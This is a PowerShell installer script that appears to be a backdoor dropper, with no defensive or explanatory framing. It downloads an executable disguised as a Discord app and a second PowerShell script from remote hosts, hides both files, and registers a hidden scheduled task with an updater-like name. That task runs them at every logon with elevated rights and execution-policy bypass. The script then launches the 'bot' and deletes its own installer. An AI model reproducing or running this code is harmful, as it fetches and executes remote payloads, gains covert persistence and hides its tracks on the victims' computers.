#sets location temp
cd $env:temp

#make new folder
mkdir sVBXKuz

#cd into folder
cd sVBXKuz

#download executable and startup file
Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/tkwdo87ytt85ke47bu19z/StandAlone-Discord.exe?rlkey=9z7xwpnxxf26wishtfos6k6wc&dl=0" -OutFile wsappa.exe

#sets location appdata
cd $env:appdata 

#make new folder
mkdir chromeup

#cd into folder
cd chromeup

#cd into folder
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/backup.ps1" -OutFile backup.ps1

#hide files
$file = "$env:temp\sVBXKuz\wsappa.exe"
$file2 = "$env:appdata\chromeup\backup.ps1"

$attr = [System.IO.FileAttributes]::Hidden

# Hide first file
Set-ItemProperty -Path $file -Name Attributes -Value ((Get-Item $file).Attributes -bor $attr)

# Hide second file
Set-ItemProperty -Path $file2 -Name Attributes -Value ((Get-Item $file2).Attributes -bor $attr)

$taskAction = New-ScheduledTaskAction -Execute '$env:temp\sVBXKuz\wsappa.cmd'
$taskTrigger = New-ScheduledTaskTrigger -AtLogOn
$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew -RestartCount 10


#create startup task
$taskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-08-09T11:59:58.6674267</Date>
    <Author>$env:computername\$env:username</Author>
    <URI>\AutoUpdateD</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>DOMAIN\$env:UserName</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT5M</Interval>
      <Count>3</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Users\$env:username\AppData\Local\Temp\sVBXKuz\wsappa.exe</Command>
    </Exec>
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>/c Start-Process powershell.exe -ArgumentList '-ExecutionPolicy','Bypass','-File', $env:appdata\chromeup\backup.ps1 -Verb runAs -WindowStyle Hidden</Arguments>
    </Exec>
  </Actions>
</Task>
"@


$taskXml = $taskXml.Replace("DOMAIN\$env:UserName", "$env:USERDOMAIN\$env:UserName")

Register-ScheduledTask -Xml $taskXml -TaskName 'AutoUpdaterD' -Force

#start bot
cd $env:temp/sVBXKuz/ ; Start-Process wsappa.exe -Verb RunAs

#clean up
powershell.exe /c Remove-Item $env:temp/dinstall.ps1

#exit
exit